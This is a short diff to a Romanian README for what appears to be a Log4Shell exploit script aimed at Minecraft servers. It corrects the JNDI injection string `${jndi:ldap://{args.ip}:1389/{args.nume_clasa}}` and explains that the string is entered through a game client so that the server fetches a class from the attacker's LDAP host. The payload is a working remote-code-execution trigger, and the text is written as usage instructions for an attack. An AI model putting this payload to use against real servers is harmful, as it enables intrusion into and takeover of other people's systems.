@@ -65,7 +65,7 @@ Aici va fi gasita linia de comanda a sistemului atacata
 
 ## Injectare si rezultate
 
-In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: `${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}`
+In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: `${jndi:ldap://{args.ip}:1389/{args.nume_clasa}}`
 
 Pentru serverul de Minecraft trebuie sa ne conectam cu un client. Dupa conexiunea la sever a clientului se introduce comanda anterioara.
 
